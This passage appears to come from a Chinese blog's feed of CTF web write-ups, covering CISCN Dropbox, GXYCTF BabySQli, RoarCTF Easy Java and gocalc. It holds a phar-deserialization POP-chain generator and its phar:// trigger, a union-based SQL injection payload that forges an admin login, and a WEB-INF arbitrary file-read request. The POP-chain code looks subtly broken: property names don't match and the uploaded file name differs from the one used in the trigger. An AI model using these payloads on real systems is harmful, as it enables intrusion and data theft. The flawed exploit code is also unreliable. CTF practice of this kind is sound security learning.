class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class是整个网站的执行功能的实现，前面都没有什么漏洞，那么大概率漏洞会存在这里</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">dbuser = <span class="string">&quot;root&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbpass = <span class="string">&quot;root&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbname = <span class="string">&quot;dropbox&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">db = new mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span></span><br></pre></td></tr></table></figure>

<p>在这个地方的开头定义了mysql数据库的链接信息并且是以root权限的，数据库操作使用了预编译，所以没什么地方可以利用</p>
<p>接下来继续看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() &#123;#构造方法（在类的最开头使用）</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function user_exist($username) &#123;	#查询用户是否存在</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        if ($count === 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function add_user($username, $password) &#123;#添加用户</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function verify_user($username, $password) &#123;#判断用户密码是否正确</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;#析构方法（在脚本结束之前运行）</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到user类中没有什么可以利用的点。</p>
<p>继续跟进FileList类</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;#构造方法</span><br><span class="line">        $this-&gt;files = array();#存储对应的file文件</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">        $filenames = scandir($path);#给filenames遍历路径下所有的文件</span><br><span class="line"></span><br><span class="line">        $key = array_search(&quot;.&quot;, $filenames);#在数组中搜索&quot;.&quot;然后返回它的键值</span><br><span class="line">        unset($filenames[$key]);#删除该键值</span><br><span class="line">        $key = array_search(&quot;..&quot;, $filenames);#在数组中搜索&quot;..&quot;返回他的键值</span><br><span class="line">        unset($filenames[$key]);#</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;#遍历文件列表</span><br><span class="line">            $file = new File();#给每一个文件创建一个实例对象</span><br><span class="line">            $file-&gt;open($path . $filename);#调用file中的open方法，判断路径中的文件是否存在</span><br><span class="line">            array_push($this-&gt;files, $file);#将file的元素添加到栈尾</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] = array();#创建一个数组，里面有对应的文件信息</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">			#</span><span class="bash">__call()是一个魔术方法，当调用一个对象中的不能用的方法的时候就回执行这个函数。有两个参数：（方法名，（枚举数组）传给name的参数）</span></span><br><span class="line">    public function __call($func, $args) &#123;#当调用不可执行方法时，在index中调用name和size时会执行，获取其名称和大小存储到文件信息中</span><br><span class="line">        array_push($this-&gt;funcs, $func);#每个文件的元素到栈尾</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;#遍历文件的file对象</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();#将文件名也添加到文件信息中</span><br><span class="line">            # $this-&gt;results[1.png][Name] = $file-&gt;Name();</span><br><span class="line">            # $this-&gt;results[1.png][Name] = $file-&gt;Size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;	#析构方法</span><br><span class="line">        $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;;</span><br><span class="line">        $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;#输出图片的对应的file信息</span><br><span class="line">            $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;;</span><br><span class="line">        $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;#遍历所有的文件信息</span><br><span class="line">            $table .= &#x27;&lt;tr&gt;&#x27;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;#输出字段名（Name,Size,Opt）</span><br><span class="line">                $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;;</span><br><span class="line">            $table .= &#x27;&lt;/tr&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析结束，也没有直接的漏洞利用方法</p>
<p>继续跟进File类</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function open($filename) &#123;#判断文件是否存在</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function name() &#123;#返回文件名</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function size() &#123;#返回文件大小</span><br><span class="line">        $size = filesize($this-&gt;filename);</span><br><span class="line">        $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;);</span><br><span class="line">        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function detele() &#123;#删除文件</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function close() &#123;#返回文件名的内容</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到里有一个close方法，里面调用的file_get_contents函数可以读取到我们需要的内容，这里可以想想办法构造漏洞，看了一下代码，在open方法中，调用了<code>file_exists</code>还有<code>is_dir</code>函数，而且在所有的网页中都没有过滤phar伪协议，可以构造一个phar反序列化漏洞</p>
<p><img src="/2022/02/28/Dropbox/7.png" alt="1"></p>
<p><strong>什么是phar反序列化</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">简单理解 phar:// 就是一个类似 file:// 的流包装器，它的作用可以使得多个文件归档到统一文件，并且在不经过解压的情况下被php所访问，并且执行。</span><br></pre></td></tr></table></figure>



<p><strong>下面看一下文件的结构</strong></p>
<p>由四部分组成：</p>
<h6 id="1、stub：phar文件标识"><a href="#1、stub：phar文件标识" class="headerlink" title="1、stub：phar文件标识"></a>1、stub：phar文件标识</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;phar://phar.phar/index.php&#x27;</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。</p>
<p>比如：<code>$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</code>可以构造一个文件被识别为GIF文件</p>
<h6 id="2、-a-manifest-describing-the-contents"><a href="#2、-a-manifest-describing-the-contents" class="headerlink" title="2、 a manifest describing the contents"></a>2、 a manifest describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<h6 id="3、the-file-contents"><a href="#3、the-file-contents" class="headerlink" title="3、the file contents"></a>3、the file contents</h6><p>被压缩的文件内容</p>
<h6 id="4、-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#4、-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="4、[optional] a signature for verifying Phar integrity (phar file format only)"></a>4、[optional] a signature for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件的末尾</p>
<p><img src="/2022/02/28/Dropbox/8.png" alt="1"></p>
<h5 id="尝试构造"><a href="#尝试构造" class="headerlink" title="尝试构造"></a>尝试构造</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$o</span>-&gt;data=<span class="string">&#x27;hello L1n!&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以生成一个phar的gif文件</p>
<p><img src="/2022/02/28/Dropbox/9.png" alt="1"></p>
<p>回到题目</p>
<p>跟进一下哪里用到了这个close方法，在User类中的析构方法中调用到了这个close方法，调用close方法的对象是db，而db是user开始的时候定义的一个公有对象，读取到文件之后，没办法回显，需要利用FileList中的__call方法（<code>__call()</code>是一个魔术方法，当调用一个对象中的不能用的方法的时候就回执行这个函数。有两个参数：）进行存储到result数组之中，然后它最后的析构方法可以将他输出到我们的文件里面。当我们访问close方法的时候，他不能用，那就会直接跳进call魔术方法之中执行file中的close方法，把我们想要读取文件的内容读取到result数组中，然后当FileList执行结束之前由析构方法输出flag， 而调用FileList中不存在的close方法的时候可以直接利用User类中的析构方法，生成一个FileList的实例对象</p>
<h3 id="构造pop链子"><a href="#构造pop链子" class="headerlink" title="构造pop链子"></a>构造pop链子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> file();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span><span class="comment">#因为不知道，这个flag的文件名是猜的</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;result = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">       	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="comment">//phar生成代码</span></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接运行函数生成phar.phar文件，上传到题目，抓包更改文件类型</p>
<p><img src="/2022/02/28/Dropbox/10.png" alt="1"></p>
<p>可以看到上传成功</p>
<p>接下来看一看download页面的源码</p>
<p>download.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    Header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到目录固定在了<code>:/etc:/tmp</code>路径中</p>
<p>这里不能直接读取到我们上传的文件</p>
<p>再看一下delete文件</p>
<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以直接伪协议读取到我们的内容</p>
<p>filename=phar://phar.png</p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>(GXYCTF2019)BabySQli</title>
    <url>/2022/01/28/GXYCTF2019-BabySQli/</url>
    <content><![CDATA[<h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><p>进入题目是这样：</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/1.png" alt="1"></p>
<p>这种题目先抓包测试</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/2.png" alt="1"></p>
<p>看到有提示，解码一下（需要一次base32和一次base64解码）</p>
<p>得到提示</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/3.png" alt="1"></p>
<p>知道这题是单引号注入</p>
<p>用wfuzz测试一下过滤</p>
<p>发现只过滤了一些=，or之类的</p>
<p>用orderby测试一下列数</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/4.png" alt="1"></p>
<p>发现是3列</p>
<p>因为知道是user表所以测试一下admin跟password在那一列</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/5.png" alt="1"></p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/6.png" alt="1"></p>
<p>发现第二列是admin时爆的是密码错误</p>
<p>所以第二列是name第三列是密码</p>
<p>后面涉及到一个知识点：</p>
<p>大部分数据库的密码存储的时候是按照md5（）编码的</p>
<p>所以这里只需要你的密码的md5的值跟第三列相同就可以插入这个账号密码登录</p>
<p>所以构造payload：</p>
<p>1’/**/union/**/select/**/1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
<p>得到flag：flag{0359ac43-f3e7-4ac6-8152-109ce5428190}</p>
]]></content>
      <tags>
        <tag>GXYCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>EasyJava</title>
    <url>/2022/02/01/EasyJava/</url>
    <content><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java类的题目没写过，还是先进去看看把</p>
<p><img src="/2022/02/01/EasyJava/3.png" alt="1"></p>
<p>不知道是啥漏洞，提示了是java应该不是sql注入</p>
<p>尝试爆破的时候发现爆出了账号密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin888</span><br></pre></td></tr></table></figure>

<p>登录进去看看</p>
<p><img src="/2022/02/01/EasyJava/1.png" alt="1"></p>
<p>可惜，flag不在这里，而且是送分题</p>
<p>去看看别的</p>
<p>主页下面有个help点进去看看</p>
<p><img src="/2022/02/01/EasyJava/2.png" alt="1"></p>
<p>好像有任意文件读取漏洞，但是读不到</p>
<p>试试直接进入，下载了一个文件</p>
<p>可是里面也没有什么信息，是个假的</p>
<p>这里我就不会做了因为java也没做过就去看了看大佬的wp</p>
<p>没想到请求方式也是假的用post可以直接下载</p>
<p>但是之前我已经下载过了</p>
<p>这之后涉及到一个java-web开发的一个点，因为没接触过所以这里偷抄记录一下大佬写的（<a class="link" href="https://blog.csdn.net/wy_97/article/details/78165051%EF%BC%89">https://blog.csdn.net/wy_97/article/details/78165051）<i class="fas fa-external-link-alt"></i></a></p>
<p>说是WEB-INF是javaweb应用的安全目录，如果想要访问其中的文件，必须通过web.xml</p>
<p>相互映射才能访问</p>
<p>简单来说就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>我们可以post传入web.xml读取一下</p>
<p><img src="/2022/02/01/EasyJava/4.png" alt="1"></p>
<p>找到flag了，发现在com/wm/ctf/FlagController里面有个flag</p>
<p>读取一下class文件</p>
<p>路径就是/classes/com/wm/ctf/FlagController.class</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>

<p>POST下载文件</p>
<p><img src="/2022/02/01/EasyJava/5.png" alt="1"></p>
<p>将其中的base64编码解码就能得到了</p>
<p><img src="/2022/02/01/EasyJava/6.png" alt="1"></p>
]]></content>
      <tags>
        <tag>RoarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GOclac</title>
    <url>/2022/02/15/GOclac/</url>
    <content><![CDATA[<h1 id="gocalc"><a href="#gocalc" class="headerlink" title="gocalc"></a>gocalc</h1><p>这道题目据说是出题的时候出错了；</p>
<p>首先打开题目</p>
<p><img src="/2022/02/15/GOclac/1.png" alt="1"></p>
<p>查看他的提示</p>
<p><img src="/2022/02/15/GOclac/2.png" alt="1"></p>
<p>他提示了flag在session中</p>
<p>我们直接抓包发包，拿到服务器端返回的session值，这次的题目返回没有进行加密</p>
<p>可以直接拿到解码，经过二次解码得到flag</p>
<p><img src="/2022/02/15/GOclac/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>V&amp;NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GameV4.0</title>
    <url>/2022/02/13/GameV4-0/</url>
